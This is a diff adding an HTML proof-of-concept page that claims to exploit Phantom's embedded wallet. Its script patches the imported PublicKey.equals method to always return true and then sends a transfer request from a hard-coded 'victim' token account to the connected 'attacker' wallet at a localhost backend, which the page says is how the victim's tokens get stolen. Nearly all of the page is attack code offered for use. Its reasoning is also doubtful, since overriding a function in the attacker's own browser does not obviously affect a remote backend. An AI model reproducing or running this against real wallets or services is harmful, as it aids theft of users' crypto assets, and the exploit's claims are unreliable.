@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Phantom Embedded Wallet Exploit PoC</title>
+  <style>
+    body { font-family: sans-serif; margin: 20px; }
+    button { margin-right: 10px; }
+    pre { background: #f0f0f0; padding: 10px; border-radius: 4px; max-height: 400px; overflow-y: auto; }
+  </style>
+</head>
+<body>
+  <h1>Phantom Embedded Wallet Ownership Spoof (Devnet SPL Token)</h1>
+  <button id="connect">Connect Attacker Wallet</button>
+  <button id="spoof" disabled>Spoof Victim Ownership</button>
+  <pre id="log"></pre>
+
+  <script type="module">
+    import * as phantomModule from "https://embedded-wallet.phantom.app/assets/metaplexMplTokenMetadata-B1auuVGR.js";
+
+    const log = (msg) => {
+      const pre = document.getElementById("log");
+      pre.innerText += msg + "\n";
+      pre.scrollTop = pre.scrollHeight;
+    };
+
+    const PublicKey = phantomModule.B;
+
+    const victimTokenAccount = "DR3PNpbPfDXwUHQVvAE2MK4f7bNEkVAzfF3QNJbneogr"; 
+    const victimMint = "CKmNnfuU2G5qTiAnQJMBSVKCX3efHyvWhLySGhj33hKU"; 
+
+    let attackerPubKey = null;
+
+    document.getElementById("connect").onclick = async () => {
+      if (!window.solana || !window.solana.isPhantom) {
+        log(" Phantom wallet extension not found. Please install and unlock Phantom.");
+        return;
+      }
+      try {
+        const resp = await window.solana.connect();
+        attackerPubKey = resp.publicKey.toString();
+        log(` Attacker Wallet Connected: ${attackerPubKey}`);
+        document.getElementById("spoof").disabled = false;
+      } catch (e) {
+        log(` Phantom wallet connection failed: ${e.message}`);
+      }
+    };
+
+    document.getElementById("spoof").onclick = async () => {
+      log(`🔒 Spoofing victim ownership by patching vulnerable Phantom module...`);
+
+      const originalEquals = PublicKey.prototype.equals;
+      PublicKey.prototype.equals = () => true;
+
+      try {
+        const victimPK = new PublicKey(victimTokenAccount);
+        const attackerPK = new PublicKey(attackerPubKey);
+
+        log(` victimTokenAccount.equals(attacker): ${victimPK.equals(attackerPK)}`);
+
+        log(` Sending malicious transfer request to backend pretending to be victim...`);
+
+        const response = await fetch("http://localhost:3009/transferAsset", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            from: victimTokenAccount,
+            to: attackerPubKey,
+            mint: victimMint,
+            amount: 1
+          }),
+        });
+
+        const data = await response.json();
+        log(` Backend response:\n${JSON.stringify(data, null, 2)}`);
+        log(` If backend trusts this request without validation, attacker steals victim tokens!`);
+      } catch (error) {
+        log(` Error: ${error.message}`);
+      } finally {
+        PublicKey.prototype.equals = originalEquals;
+        log(` Restored PublicKey.equals to original.`);
+      }
+    };
+  </script>
+</body>
+</html>
